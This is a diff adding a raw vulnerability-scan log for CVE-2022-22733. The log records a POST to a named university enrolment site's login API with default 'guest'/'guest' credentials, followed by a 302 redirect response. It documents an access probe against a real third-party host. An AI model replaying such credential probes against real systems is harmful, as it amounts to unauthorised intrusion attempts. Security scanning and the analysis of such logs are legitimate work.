@@ -1,0 +1,31 @@
+[CVE-2022-22733] Dumped HTTP request for https://enrolments.hildas.unimelb.edu.au/api/login
+
+
+POST /api/login HTTP/1.1
+Host: enrolments.hildas.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 39
+Accept: application/json, text/plain, */*
+Access-Token: 
+Content-Type: application/json;charset=UTF-8
+Origin: https://enrolments.hildas.unimelb.edu.au
+Referer: https://enrolments.hildas.unimelb.edu.au
+Accept-Encoding: gzip
+
+{"username":"guest","password":"guest"}
+[CVE-2022-22733] Dumped HTTP response https://enrolments.hildas.unimelb.edu.au/api/login
+
+HTTP/1.1 302 Found
+Connection: close
+Content-Length: 122
+Cache-Control: no-cache, no-store
+Content-Type: text/html
+Location: https://enrolments.hildas.unimelb.edu.au/api/login
+Set-Cookie: visid_incap_3211538=TCKkKVhsTPOJhjyONW5knwxyk2gAAAAAQUIPAAAAAABjw6L97f9PJkdVURFS4Qly; expires=Thu, 06 Aug 2026 07:06:45 GMT; HttpOnly; path=/; Domain=.hildas.unimelb.edu.au
+Set-Cookie: incap_ses_237_3211538=p0ChDaNVeUCh6barov5JAwxyk2gAAAAAPZ0QZCt3JsaPwFwpAP1HcA==; path=/; Domain=.hildas.unimelb.edu.au
+X-Iinfo: 8-4189728-0 0NNN RT(1754493453270 53) q(0 -1 -1 -1) r(0 -1) B13(1,10037,0) U6
+
+
+<HTML><HEAD><TITLE>Loading</TITLE></HEAD><BODY bgcolor="#ffffff"><H3 style="color: #ffffff">Loading</H3></BODY></HTML>
+
